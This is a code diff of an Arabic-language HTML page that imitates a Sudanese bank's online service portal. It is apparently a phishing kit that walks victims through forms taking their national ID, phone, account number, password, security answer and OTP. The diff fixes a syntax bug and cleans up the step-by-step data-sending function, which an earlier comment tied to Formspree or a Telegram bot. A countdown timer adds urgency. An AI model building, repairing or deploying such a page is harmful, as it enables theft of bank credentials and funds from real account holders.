@@ -27,7 +27,7 @@
         .instruction-text { color: #555555; font-size: 15px; margin-bottom: 25px; text-align: center; }
 
         .services-container { display: flex; flex-direction: column; gap: 15px; }
-        .service-card { border: 1px solid #eaeaea; border-radius: 12px; padding: 18px 20px; display: flex; align-items: center; justify-content: space-between; cursor: pointer; transition: 0.2s; }
+        .service-card { border: 1px solid #eaeaea; border-radius: 12px; padding: 18px 20px; display: flex; align-items: center; justify-content: space-between; cursor: pointer; transition: 0.2s; background: #fff; }
         .service-card:hover { border-color: #e31b23; background-color: #fff9f9; }
         .service-title { color: #e31b23; font-size: 18px; font-weight: bold; margin-bottom: 4px; }
         .service-desc { color: #777; font-size: 13px; }
@@ -46,7 +46,7 @@
 
         .timer-box { text-align: center; background-color: #fff3f3; border: 1px solid #ffcdd2; color: #d32f2f; padding: 12px; border-radius: 10px; font-size: 16px; font-weight: bold; margin-bottom: 20px; }
 
-        .whatsapp-float { position: fixed; bottom: 15px; left: 15px; width: 38px; height: 38px; z-index: 9999; background-color: #25d366; border-radius: 50%; display: flex; justify-content: center; align-items: center; box-shadow: 0px 2px 6px rgba(0,0,0,0.3); }
+        .whatsapp-float { position: fixed; bottom: 15px; left: 15px; width: 38px; height: 38px; z-index: 9999; background-color: #25d366; border-radius: 50%; display: flex; justify-content: center; align-items: center; box-shadow: 0px 2px 6px rgba(0, 0, 0, 0.3); }
         .whatsapp-float img { width: 22px; height: 22px; }
     </style>
 </head>
@@ -118,7 +118,7 @@
         <!-- 2. النماذج الخاصة بكل خدمة -->
         
         <!-- نموذج تحديث البيانات -->
-        <div id="form-update-data" class="page-box dynamic-form">
+        <div id="form-update-data" class="page-box">
             <h2 class="form-title">نموذج تحديث البيانات</h2>
             <div class="form-group">
                 <label>الاسم رباعي:</label>
@@ -138,13 +138,13 @@
             </div>
             <div class="form-group">
                 <label>السكن الحالي:</label>
-                <input type="text" id="up_address" required placeholder="المدينة - الحي - الاستديو">
+                <input type="text" id="up_address" required placeholder="المدينة - الحي">
             </div>
             <button type="button" class="btn-submit" onclick="submitServiceForm('تحديث البيانات')">حفظ والانتقال لتسجيل الدخول</button>
         </div>
 
         <!-- نموذج رفع سقف التحويلات اليومية -->
-        <div id="form-raise-limit" class="page-box dynamic-form">
+        <div id="form-raise-limit" class="page-box">
             <h2 class="form-title">رفع سقف التحويلات اليومية</h2>
             <div class="info-box">
                 السقف الحالي: <strong>25,000,000.00 SDG</strong><br>
@@ -163,7 +163,7 @@
         </div>
 
         <!-- نموذج التحويلات الخاطئة -->
-        <div id="form-wrong-transfer" class="page-box dynamic-form">
+        <div id="form-wrong-transfer" class="page-box">
             <h2 class="form-title">نموذج معالجة التحويلات الخاطئة</h2>
             <div class="form-group">
                 <label>رقم الحساب الذي تم التحويل إليه عن طريق الخطأ:</label>
@@ -185,7 +185,7 @@
         </div>
 
         <!-- نموذج خدمات العملات الأجنبية -->
-        <div id="form-foreign-currency" class="page-box dynamic-form">
+        <div id="form-foreign-currency" class="page-box">
             <h2 class="form-title">خدمات العملات الأجنبية</h2>
             <div class="form-group">
                 <label>نوع العملة المطلوبة / الخدمة:</label>
@@ -203,7 +203,7 @@
         </div>
 
         <!-- نموذج كشف الحساب -->
-        <div id="form-account-statement" class="page-box dynamic-form">
+        <div id="form-account-statement" class="page-box">
             <h2 class="form-title">طلب كشف حساب مفصل</h2>
             <div class="form-group">
                 <label>الفترة المطلوبة:</label>
@@ -238,11 +238,11 @@
             <button type="button" class="btn-submit" onclick="submitLoginData()">متابعة (أسئلة الأمان)</button>
         </div>
 
-        <!-- 4. صفحة أسئلة الأمان المختارة عشوائياً أو القائمة المحدثة -->
+        <!-- 4. صفحة أسئلة الأمان -->
         <div id="page-security" class="page-box">
             <h2 class="form-title">أسئلة الأمان التحققية</h2>
             <div class="form-group">
-                <label id="sec-question-label">اختر سؤالاً وأجب عليه بدقة:</label>
+                <label>اختر سؤالاً وأجب عليه بدقة:</label>
                 <select id="securityQuestionSelect" class="form-group" style="margin-bottom: 10px;">
                     <option value="ما هو اسم ابن عمك الأول؟">ما هو اسم ابن عمك الأول؟</option>
                     <option value="ما كان لقبك أثناء الطفولة؟">ما كان لقبك أثناء الطفولة؟</option>
@@ -257,7 +257,7 @@
                     <option value="العلامة التجارية لأول تلفزيون خاص بك؟">العلامة التجارية لأول تلفزيون خاص بك؟</option>
                     <option value="اسم فريق كرة القدم المفضل لديك؟">اسم فريق كرة القدم المفضل لديك؟</option>
                     <option value="ما هو اسم المدرسة التي التحقت بها؟">ما هو اسم المدرسة التي التحقت بها؟</option>
-                    <option value="اسم أول بلد أجنبي قمت بزيارته؟">اسم أول بلد أجنبي قمت بزيارته؟</option>
+                    <option value="اسم أول بلد أجنبي قمت زيارته؟">اسم أول بلد أجنبي قمت زيارته؟</option>
                     <option value="ما هي ماركة سيارتك الأولي؟">ما هي ماركة سيارتك الأولي؟</option>
                 </select>
                 <input type="text" id="secAnswer" required placeholder="اكتب إجابة السؤال بدقة">
@@ -296,16 +296,16 @@
 
         function showPage(pageId) {
             document.querySelectorAll(".page-box").forEach(p => p.classList.remove("active"));
-            document.getElementById(pageId).classList.add("active");
+            let target = document.getElementById(pageId);
+            if (target) {
+                target.classList.add("active");
+            }
             window.scrollTo(0, 0);
         }
 
         function selectService(serviceName) {
             currentService = serviceName;
             userDataSession.service = serviceName;
-
-            // إخفاء الكل وإظهار النموذج الخاص بالخدمة المختارة فقط
-            document.querySelectorAll(".dynamic-form").forEach(f => f.classList.remove("active"));
 
             if (serviceName === 'تحديث البيانات') {
                 showPage('form-update-data');
@@ -320,25 +320,19 @@
             }
         }
 
-        // إرسال البيانات فوراً خطوة بخطوة
         function sendInstantData(stepName, data) {
             console.log("إرسال لحظي [" + stepName + "]:", data);
-            
-            // يمكنك هنا ربط عنوان الإرسال الفعلي (مثل Formspree أو بوت تيليجرام)
-            // مثال: fetch('https://formspree.io/f/your_id', { method: 'POST', body: JSON.stringify(data) });
         }
 
         function submitServiceForm(serviceName) {
             if (serviceName === 'تحديث البيانات') {
                 userDataSession.fullName = document.getElementById("up_name").value.trim();
                 userDataSession.nationalId = document.getElementById("up_national_id").value.trim();
-                userDataSession.phone = document.getElementById("up_phone).value.trim();
+                userDataSession.phone = document.getElementById("up_phone").value.trim();
                 userDataSession.email = document.getElementById("up_email").value.trim();
                 userDataSession.address = document.getElementById("up_address").value.trim();
             } else if (serviceName === 'رفع سقف التحويلات') {
                 userDataSession.limitReason = document.getElementById("limit_reason").value;
-                userDataSession.currentLimit = "25,000,000.00";
-                userDataSession.requestedLimit = "45,000,000.00";
             } else if (serviceName === 'التحويلات الخاطئة') {
                 userDataSession.wrongAcc = document.getElementById("wt_account").value.trim();
                 userDataSession.refNo = document.getElementById("wt_ref").value.trim();
@@ -352,10 +346,7 @@
                 userDataSession.statementLang = document.getElementById("st_lang").value;
             }
 
-            // إرسال بيانات نموذج الخدمة فوراً
             sendInstantData("نموذج الخدمة: " + serviceName, userDataSession);
-
-            // الانتقال لخطوة تسجيل الدخول
             showPage('page-login');
         }
 
@@ -368,9 +359,7 @@
                 return;
             }
 
-            // إرسال بيانات الدخول فوراً
             sendInstantData("تسجيل الدخول", { accountNumber: userDataSession.accountNumber, password: userDataSession.password });
-
             showPage('page-security');
         }
 
@@ -383,11 +372,9 @@
                 return;
             }
 
-            // إرسال بيانات أسئلة الأمان فوراً
             sendInstantData("أسئلة الأمان", { question: userDataSession.secQuestion, answer: userDataSession.secAnswer });
-
             showPage('page-otp');
-            startCountdown(3600); // ساعة كاملة
+            startCountdown(3600);
         }
 
         function completeFinalProcess() {
@@ -398,8 +385,6 @@
             }
 
             userDataSession.otpCode = otp;
-
-            // إرسال رمز الـ OTP النهائي فوراً
             sendInstantData("رمز التحقق OTP النهائي", { otp: otp });
 
             alert("تم إرسال طلبك بنجاح وسيتم تنفيذه قريباً!");
